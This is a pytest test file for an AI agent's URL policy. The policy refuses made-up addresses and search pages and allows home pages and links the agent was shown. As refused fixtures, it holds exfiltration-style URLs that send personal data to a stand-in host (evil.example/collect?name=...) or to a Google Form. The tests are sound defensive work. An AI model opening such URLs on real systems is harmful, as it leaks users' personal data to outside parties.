# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Axxlabs Limited
"""Which addresses open (SPEC §5.2 rule 7)."""

from __future__ import annotations

import pytest

from aha_local.policy import addresses
from aha_local.policy.browser import open_action
from aha_local.policy.gate import Facts, decide
from aha_local.tools import web
from aha_local.tools.browser import make_handler

from .conftest import person, settle
from .test_mail import FakeApprovals, ctx_for

SNAPSHOT = (
    "### Page\n- Page URL: https://www.waitrose.com/ecom/shop/trolley\n### Snapshot\n```yaml\n"
    '- link "Search" [ref=e5]:\n  - /url: /ecom/shop/search?searchTerm=rice&sortBy=RELEVANCE\n```'
)


def verdict(url, seen=frozenset()):
    v = decide(open_action(url), Facts(shown=set(seen)))
    return v.outcome, v.why


@pytest.mark.made_up_rule
def test_an_address_opens_only_when_it_was_shown_or_is_a_home_page():
    seen = addresses.seen_in("Results: https://news.example/a?id=42 and more")
    assert verdict("https://NEWS.example/a/?id=42", seen) == ("run", "")  # shown to the task, however written
    assert verdict("https://evil.example/?d=Felipe+lives+here", seen) == ("refuse", "made_up")
    assert verdict("https://evil.example/#d=secret", seen) == ("refuse", "made_up")
    assert verdict("https://evil.example/") == ("card", "open")
    page = addresses.seen_in(SNAPSHOT)  # a snapshot's own link, relative to its page
    url = "https://www.waitrose.com/ecom/shop/search?sortBy=RELEVANCE&searchTerm=rice"
    assert verdict(url, page) == ("run", "")
    assert verdict(url.replace("rice", "felipe+lavratti"), page) == ("refuse", "made_up")
    for search in (
        "https://www.google.com/search?q=felipe",
        "https://www.google.co.uk/search?q=x",
        "https://duckduckgo.com/?q=x",
    ):
        assert verdict(search) == ("refuse", "search")
    assert verdict("https://google.xyz/?d=1") == ("refuse", "made_up")  # not Google's
    form = "https://docs.google.com/forms/d/e/1FAIpQL/formResponse?entry.1=Felipe"
    assert verdict(form) == ("refuse", "made_up")


class Session:
    def __init__(self) -> None:
        self.calls: list[tuple[str, dict]] = []

    async def call(self, name, args, timeout=90):
        import mcp.types as mt

        self.calls.append((name, args))
        if name == "browser_tabs":
            return mt.CallToolResult(
                content=[mt.TextContent(type="text", text="- 0: (current) [x](https://a.example/)")]
            )
        url = args.get("url", "https://a.example/")
        text = f"### Page\n- Page URL: {url}\n### Snapshot\n```yaml\n- text: hi\n```"
        return mt.CallToolResult(content=[mt.TextContent(type="text", text=text)])


@pytest.mark.made_up_rule
async def test_the_browser_opens_only_addresses_it_has(accounts, config):
    """SPEC §5.2 "Made-up addresses": a home page or a link it was shown; anything else is refused before it loads,
    with the way to find it instead (seen: a tracking page's address from memory, a 404)."""
    fe = person(accounts)
    approvals = FakeApprovals()  # declines
    ctx = ctx_for(fe, config, approvals)
    ctx.browser = Session()
    for url in (
        "https://www.fedex.com/en-gb/tracking?track-numbers=385413566727",
        "https://evil.example/?d=Felipe",  # data too
        "https://news.example/today",
    ):
        result = await make_handler("browser_navigate")({"url": url}, ctx)
        assert result.error and result.text.startswith(f"Not opened: {url}")
        assert "Open the site's home page, https://" in result.text
        assert ("browser_navigate", {"url": url}) not in ctx.browser.calls
    assert not approvals.asked  # refused: no card to approve a guess
    # A home page and links the task was shown open as before: no card.
    addresses.remember(ctx.task.seen_urls, SNAPSHOT)
    for url in (
        "https://www.fedex.com/",
        "https://www.waitrose.com/ecom/shop/search?searchTerm=rice&sortBy=RELEVANCE",
    ):
        assert not (await make_handler("browser_navigate")({"url": url}, ctx)).error, url
    assert not approvals.asked
    # A search engine's results page: web_search does searches.
    url = "https://www.google.com/search?q=fedex+tracking"
    result = await make_handler("browser_navigate")({"url": url}, ctx)
    assert result.error and "web_search" in result.text and not approvals.asked


@pytest.mark.made_up_rule
async def test_fetch_url_opens_only_addresses_it_has(accounts, config):
    fe = person(accounts)
    approvals = FakeApprovals()
    ctx = ctx_for(fe, config, approvals)
    result = await web.fetch_url({"url": "https://evil.example/collect?name=Felipe&city=London"}, ctx)
    assert result.error and result.text.startswith("Not opened: https://evil.example/collect")
    assert not approvals.asked


@pytest.mark.made_up_rule
async def test_a_link_the_person_sent_is_theirs_but_a_checks_own_instructions_arent(
    agent, llm, chat, accounts, registry
):
    """A wakeup runs its topic's instructions as the request: an address in them isn't the person's (seen: the
    model wrote a tracking address into the task from memory, so its check trusted it)."""
    from aha_local import topics
    from aha_local.agent import Job

    web.register(registry)
    fe = person(accounts)
    n = topics.new(fe)
    url = "https://track.example.invalid/parcel?n=1"  # never resolves: an error after the gate, not a refusal
    for job in (Job(n), None):
        llm.call("fetch_url", url=url)
        llm.answer("WAITING: no" if job else "Couldn't.")
        await agent.run(fe, f"Check {url}", n, job)
        await settle(agent)
        result = [m["content"] for m in llm.requests[-1]["messages"] if m.get("role") == "tool"][-1]
        assert result.startswith(f"Not opened: {url}") is (job is not None)


def test_a_search_engines_home_page_is_an_open_not_a_search():
    """Seen 2026-11-26: opening google.com asked "Search google.com for this?" with nothing to search."""
    assert not addresses.is_search("https://www.google.com")
    assert not addresses.is_search("https://duckduckgo.com/")
    assert addresses.is_search("https://www.google.com/search?q=drive+time")
    assert addresses.is_search("https://duckduckgo.com/?q=foil")
